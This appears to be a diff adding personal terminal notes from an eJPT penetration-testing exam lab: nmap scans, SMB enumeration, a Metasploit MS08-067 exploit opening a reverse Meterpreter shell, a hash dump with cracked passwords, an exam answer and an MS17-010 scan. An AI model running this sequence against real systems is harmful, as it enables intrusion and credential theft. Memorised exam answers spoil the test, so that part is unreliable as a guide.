@@ -1,0 +1,453 @@
+ sudo nmap -sn 192.168.193.0/24
+[sudo] password for chakresh: 
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-09-08 01:23 EDT
+Nmap scan report for 192.168.193.4
+Host is up (0.033s latency).
+MAC Address: 00:50:56:A1:75:1E (VMware)
+Nmap scan report for 192.168.193.14
+Host is up (-0.11s latency).
+MAC Address: 00:50:56:A1:FE:C6 (VMware)
+Nmap scan report for 192.168.193.85
+Host is up (-0.088s latency).
+MAC Address: 00:50:56:A1:C7:4B (VMware)
+Nmap scan report for 192.168.193.211
+Host is up (-0.085s latency).
+MAC Address: 00:50:56:A1:D2:2F (VMware)
+Nmap scan report for 192.168.193.212
+Host is up (-0.071s latency).
+MAC Address: 00:50:56:A1:E5:33 (VMware)
+Nmap scan report for 192.168.193.70
+Host is up.
+Nmap done: 256 IP addresses (6 hosts up) scanned in 4.82 seconds
+
+
+192.168.193.4
+14, 85 211 212 70
+----------------------
+
+chakresh@Serendipity:~$ nmap -sV 192.168.193.212
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-09-08 01:50 EDT
+Nmap scan report for 192.168.193.212
+Host is up (0.036s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows 98 netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows 98, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_98, cpe:/o:microsoft:windows_xp
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
+------------------------------------------------
+chakresh@Serendipity:/opt/enum4linux$ ./enum4linux.pl -n 192.168.193.212
+WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
+WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep  8 01:58:42 2018
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.193.212
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ======================================================= 
+|    Enumerating Workgroup/Domain on 192.168.193.212    |
+ ======================================================= 
+[+] Got domain/workgroup name: WORKGROUP
+
+ =============================================== 
+|    Nbtstat Information for 192.168.193.212    |
+ =============================================== 
+Looking up status of 192.168.193.212
+	ELS-WINXP2      <00> -         B <ACTIVE>  Workstation Service
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	ELS-WINXP2      <20> -         B <ACTIVE>  File Server Service
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-50-56-A1-E5-33
+
+ ======================================== 
+|    Session Check on 192.168.193.212    |
+ ======================================== 
+[+] Server 192.168.193.212 allows sessions using username '', password ''
+
+ ============================================== 
+|    Getting domain SID for 192.168.193.212    |
+ ============================================== 
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid from server
+error: NT_STATUS_ACCESS_DENIED
+[+] Can't determine if host is part of domain or part of a workgroup
+enum4linux complete on Sat Sep  8 01:58:42 2018
+-----------------------------------------------------------------------
+
+
+chakresh@Serendipity:/opt/enum4linux$ ./enum4linux.pl -a 192.168.193.212
+WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
+WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep  8 02:00:34 2018
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.193.212
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ======================================================= 
+|    Enumerating Workgroup/Domain on 192.168.193.212    |
+ ======================================================= 
+[+] Got domain/workgroup name: WORKGROUP
+
+ =============================================== 
+|    Nbtstat Information for 192.168.193.212    |
+ =============================================== 
+Looking up status of 192.168.193.212
+	ELS-WINXP2      <00> -         B <ACTIVE>  Workstation Service
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	ELS-WINXP2      <20> -         B <ACTIVE>  File Server Service
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-50-56-A1-E5-33
+
+ ======================================== 
+|    Session Check on 192.168.193.212    |
+ ======================================== 
+[+] Server 192.168.193.212 allows sessions using username '', password ''
+
+ ============================================== 
+|    Getting domain SID for 192.168.193.212    |
+ ============================================== 
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid from server
+error: NT_STATUS_ACCESS_DENIED
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ========================================= 
+|    OS information on 192.168.193.212    |
+ ========================================= 
+[+] Got OS info for 192.168.193.212 from smbclient: Domain=[ELS-WINXP2] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
+[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED
+
+ ================================ 
+|    Users on 192.168.193.212    |
+ ================================ 
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ============================================ 
+|    Share Enumeration on 192.168.193.212    |
+ ============================================ 
+[E] Can't list shares: NT_STATUS_ACCESS_DENIED
+
+[+] Attempting to map shares on 192.168.193.212
+
+ ======================================================= 
+|    Password Policy Information for 192.168.193.212    |
+ ======================================================= 
+[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
+
+
+ ================================= 
+|    Groups on 192.168.193.212    |
+ ================================= 
+
+[+] Getting builtin groups:
+[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+[E] Can't get local groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting domain group memberships:
+
+ ========================================================================== 
+|    Users on 192.168.193.212 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ========================================================================== 
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+ ================================================ 
+|    Getting printer info for 192.168.193.212    |
+ ================================================ 
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid from server
+error: NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sat Sep  8 02:00:37 2018
+
+chakresh@Serendipity:/opt/enum4linux$ 
+----------------------
+Nessus scan
+
+meterpreter > sysinfo
+Computer        : ELS-WINXP2
+OS              : Windows XP (Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+
+0905             (netadmin:2)
+CONGRAT          (netadmin:1)
+ELSADMI          (Administrator:1)
+NPWD             (Administrator:2)
+----------------
+
+
+
+msf exploit(windows/smb/ms08_067_netapi) > show options 
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.193.212  yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > exploit 
+
+[*] Started reverse TCP handler on 192.168.193.71:4444 
+[*] 192.168.193.212:445 - Automatically detecting the target...
+[*] 192.168.193.212:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 192.168.193.212:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 192.168.193.212:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179779 bytes) to 192.168.193.212
+[*] Meterpreter session 1 opened (192.168.193.71:4444 -> 192.168.193.212:1050) at 2018-09-08 03:32:28 -0400
+
+meterpreter > 
+
+
+meterpreter > sysinfo
+Computer        : ELS-WINXP2
+OS              : Windows XP (Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > getsystem 
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
+
+meterpreter > hashdump
+Administrator:500:6df60586675b97c51f6252914a7633d7:fc5399dc481550f5442d1585e10c0345:::
+elsuser:1005:aad3b435b51404eeaad3b435b51404ee:04820cccb2ea44ad7e60f97961fba7e1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d:::
+netadmin:1004:a4fd0910b9418e67d342ec751ef6b28d:6757a9560a881a505b9fa7bfadd88874:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::
+
+
+meterpreter > run get_env
+[*] Getting all System and User Variables
+
+Enviroment Variable list
+========================
+
+ Name                    Value
+ ----                    -----
+                         Ɛ	῰͇L
+ ComSpec                 C:\WINDOWS\system32\cmd.exe
+ FP_NO_HOST_CHECK        NO
+ NUMBER_OF_PROCESSORS    1
+ OS                      Windows_NT
+ PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+ PROCESSOR_ARCHITECTURE  x86
+ PROCESSOR_IDENTIFIER    x86 Family 6 Model 79 Stepping 1, GenuineIntel
+ PROCESSOR_LEVEL         6
+ PROCESSOR_REVISION      4f01
+ Path                    C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem
+ TEMP                    C:\WINDOWS\TEMP
+ TMP                     C:\WINDOWS\TEMP
+ windir                  C:\WINDOWS
+
+
+ANSWER 10
+meterpreter > cat secret.txt 
+Tn2HZ9pFYCudtZDkaJjheiPtmIzJp8I9 
+
+
+msf exploit(windows/smb/ms08_067_netapi) > use post/windows/gather/forensics/enum_drives 
+msf post(windows/gather/forensics/enum_drives) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                       Connection
+  --  ----  ----                     -----------                       ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ELS-WINXP2  192.168.193.71:4444 -> 192.168.193.212:1050 (192.168.193.212)
+
+msf post(windows/gather/forensics/enum_drives) > set SESSION 1
+SESSION => 1
+msf post(windows/gather/forensics/enum_drives) > show options 
+
+Module options (post/windows/gather/forensics/enum_drives):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   MAXDRIVES  10               no        Maximum physical drive number
+   SESSION    1                yes       The session to run this module on.
+
+msf post(windows/gather/forensics/enum_drives) > run
+
+Device Name:                    Type:   Size (bytes):
+------------                    -----   -------------
+<Physical Drives:>
+\\.\PhysicalDrive0                   4702111234474983745
+<Logical Drives:>
+\\.\A:                               4702111234474983745
+\\.\C:                               4702111234474983745
+[*] Post module execution completed
+
+
+-------------------
+chakresh@Serendipity:~/Downloads/eJPT Exam$ john hashdump --show
+Administrator:ELSADMINPWD:500:6df60586675b97c51f6252914a7633d7:fc5399dc481550f5442d1585e10c0345:::
+elsuser::1005:aad3b435b51404eeaad3b435b51404ee:04820cccb2ea44ad7e60f97961fba7e1:::
+Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:???????SYN6UOO:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d:::
+netadmin:CONGRAT0905:1004:a4fd0910b9418e67d342ec751ef6b28d:6757a9560a881a505b9fa7bfadd88874:::
+SUPPORT_388945a0::1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::
+
+--------------
+
+GET /albums/ixnay.jpg HTTP/1.1
+Host: 10.86.74.7
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+Accept: image/png,image/*;q=0.8,*/*;q=0.5
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.86.74.7/
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Sun, 08 Mar 2015 14:51:46 GMT
+Server: Apache/2.2.15 (CentOS)
+Last-Modified: Thu, 05 Mar 2015 15:39:34 GMT
+ETag: "715e-38ba-5108c5fedecb8"
+Accept-Ranges: bytes
+Content-Length: 14522
+Connection: close
+Content-Type: image/jpeg
+
+
+-------------------
+
+msf > nmap -sn 192.168.193.85
+[*] exec: nmap -sn 192.168.193.85
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-09-08 04:01 EDT
+Nmap scan report for 192.168.193.85
+Host is up (0.027s latency).
+MAC Address: 00:50:56:A1:C7:4B (VMware)
+Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
+msf > nmap -A 192.168.193.85
+[*] exec: nmap -A 192.168.193.85
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-09-08 04:02 EDT
+Nmap scan report for 192.168.193.85
+Host is up (0.027s latency).
+All 1000 scanned ports on 192.168.193.85 are filtered
+MAC Address: 00:50:56:A1:C7:4B (VMware)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT      ADDRESS
+1   27.32 ms 192.168.193.85
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.62 seconds
+msf > nmap -sV 192.168.193.85
+[*] exec: nmap -sV 192.168.193.85
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-09-08 04:03 EDT
+Nmap scan report for 192.168.193.85
+Host is up (0.026s latency).
+All 1000 scanned ports on 192.168.193.85 are filtered
+MAC Address: 00:50:56:A1:C7:4B (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.54 seconds
+msf > nmap -Pn 192.168.193.85
+[*] exec: nmap -Pn 192.168.193.85
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-09-08 04:04 EDT
+Nmap scan report for 192.168.193.85
+Host is up (0.026s latency).
+All 1000 scanned ports on 192.168.193.85 are filtered
+MAC Address: 00:50:56:A1:C7:4B (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds
+msf > 
+---------------------------
+
+
+msf > nmap -Pn 192.168.193.211
+[*] exec: nmap -Pn 192.168.193.211
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-09-08 04:07 EDT
+Nmap scan report for 192.168.193.211
+Host is up (0.029s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 00:50:56:A1:D2:2F (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 98.35 seconds
+
+----------------
+msf auxiliary(scanner/smb/smb_ms17_010) > exploit 
+
+[+] 192.168.193.211:445   - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+--------------------------------------
+
+
+
+
